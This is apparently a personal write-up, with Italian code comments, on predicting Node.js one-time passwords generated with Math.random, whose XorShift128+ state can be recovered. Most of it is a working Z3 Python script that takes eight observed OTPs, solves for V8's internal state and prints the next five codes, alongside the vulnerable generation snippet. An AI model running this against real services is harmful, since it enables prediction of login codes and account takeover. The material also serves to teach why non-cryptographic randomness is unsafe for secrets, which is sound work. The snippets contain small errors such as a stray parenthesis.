



# Prng



Prng stands for Pseudo Random Generation number and `Node.js` use it as it's default random engine.

Implementation is a very easy Algorithm to predict and could be very dangerous if is used to generate otps like this basic node operation.

##### Node base otp generation 
```js
const otp = Math.floor(100000 + Math.random() * 900000));  
```
In little snippet is presented the possibility to generate a z3-solver script to predict next number generation which is SMT(Satisfied Modulo Theories).

The Algorithn XorShift128+ was implemented with this formuala as you can see [here](https://github.com/v8/v8/blob/085fed0fb5c3b0136827b5d7c190b4bd1c23a23e/src/base/utils/random-number-generator.h#L102)

```c
static inline void XorShift128(uint64_t* state0, uint64_t* state1) {
    uint64_t s1 = *state0;
    uint64_t s0 = *state1;
    *state0 = s0;
    s1 ^= s1 << 23;
    s1 ^= s1 >> 17;
    s1 ^= s0;
    s1 ^= s0 >> 26;
    *state1 = s1;
  }
```

#### Inverting the Xorshift128+ random number generator

It takes in two 64-bit states, state0 and state1. At the end of the algorithm, the new state0 becomes the old state1 and the new state1 is entirely determined by exclusive-or operations of various bits from the old state0 and state1. Note that the bit shifts essentially select which bits get mixed into each position of the new state1. `` `Math.random( )` `` performs an [integer addition of the new state values](https://github.com/v8/v8/blob/085fed0fb5c3b0136827b5d7c190b4bd1c23a23e/src/base/utils/random-number-generator.h#L97) and converts it to a double, which is the output. This is also where bits are dropped because a 64-bit unsigned int cannot be represented exactly as a double.

![[assets/Pasted image 20260211161840.png]]


## Prediction


Prediction can be done trough only a sinlge array of 8 consecutive otp generation to calculate state0 and state1 of the mantissa. 

```powershell
> Array.from({ length: 8 }, () => Math.floor(100000 + Math.random() * 900000));  
[  
 802536, 585427,  
 238244, 805296,  
 989541, 922753,  
 133942, 870434  
]

```
and with my script 

```python
from z3 import *

MASK64 = (1 << 64) - 1

def v8_xorshift128p_step(s0, s1):
    t1 = s0
    t0 = s1
    t1 ^= (t1 << 23) & MASK64
    t1 ^= LShR(t1, 17)
    t1 ^= t0
    t1 ^= LShR(t0, 26)
    return t0 & MASK64, t1 & MASK64

def solve_and_predict(otp_history):
    # --- 1. MODELLAZIONE ---
    solver = Solver()
    
    # Stato simbolico iniziale
    s0_init = BitVec("s0_init", 64)
    s1_init = BitVec("s1_init", 64)
    
    curr_s0, curr_s1 = s0_init, s1_init
    
    MIN_VAL = 100000
    RANGE = 900000
    TWO52 = 1 << 52

    print(f"[*] Costruzione modello con {len(otp_history)} OTP...")
    
    for otp in otp_history:
        # Step PRNG
        curr_s0, curr_s1 = v8_xorshift128p_step(curr_s0, curr_s1)
        
        # Mantissa (state0 >> 12)
        mantissa_bv = LShR(curr_s0, 12)
        mantissa_int = BV2Int(mantissa_bv)
        
        # Disequazioni
        lo = (otp - MIN_VAL) * TWO52
        hi = (otp + 1 - MIN_VAL) * TWO52
        
        solver.add(mantissa_int * RANGE >= lo)
        solver.add(mantissa_int * RANGE <  hi)

    # --- 2. RISOLUZIONE ---
    print("[*] Ricerca dello stato interno in corso (Z3)...")
    if solver.check() == sat:
        m = solver.model()
        s0_val = m[s0_init].as_long()
        s1_val = m[s1_init].as_long()
        
        print(f"[*] STATO INIZIALE TROVATO!")
        print(f"s0_init: {hex(s0_val)}")
        print(f"s1_init: {hex(s1_val)}")
        
        # Funzione di step in Python puro per i numeri estratti
        def python_step(curr_s0, curr_s1):
            t1 = curr_s0
            t0 = curr_s1
            t1 = (t1 ^ (t1 << 23)) & MASK64
            t1 = (t1 ^ (t1 >> 17)) & MASK64 # Shift destro normale in Python
            t1 = (t1 ^ t0) & MASK64
            t1 = (t1 ^ (t0 >> 26)) & MASK64
            return t0 & MASK64, t1 & MASK64

        # --- 3. PREVISIONE ---
        # Avanziamo lo stato reale attraverso la history (quella invertita che hai usato)
        temp_s0, temp_s1 = s0_val, s1_val
        for _ in range(len(otp_history)):
            temp_s0, temp_s1 = python_step(temp_s0, temp_s1)
            
        # Ora generiamo i PROSSIMI OTP. 
        # Nota: V8 li sputa fuori dall'ultimo del batch al primo.
        print("\n[*] PROSSIME PREVISIONI (Ordine di uscita previsto):")
        for i in range(1, 6):
            temp_s0, temp_s1 = python_step(temp_s0, temp_s1)
            final_mantissa = temp_s0 >> 12
            prediction = int(100000 + (final_mantissa / float(TWO52)) * RANGE)
            print(f"[*] OTP +{i}: {prediction}")
            
        return True

# Usa una history breve (es. primi 15) per evitare il problema del batch inverso di V8
history = [
  802536, 585427,
  238244, 805296,
  989541, 922753,
  133942, 870434
]

solve_and_predict(history[::-1])

```

